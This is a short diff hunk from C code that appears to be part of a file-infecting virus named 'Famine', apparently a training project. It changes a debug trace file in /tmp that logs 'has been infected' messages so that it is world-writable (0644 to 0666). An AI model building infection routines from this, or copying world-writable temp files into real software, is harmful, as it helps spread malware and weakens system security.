@@ -82,7 +82,7 @@ void inject(struct s_info *info)
 	release_info(info);
 #if DEBUG
 	char name[] = "/tmp/trace";
-	int fd = _open(name, O_RDWR | O_CREAT | O_APPEND, 0644);
+	int fd = _open(name, O_RDWR | O_CREAT | O_APPEND, 0666);
 	char fam[] = "Famine: ";
 	char des[] = " has been infected\n";
 
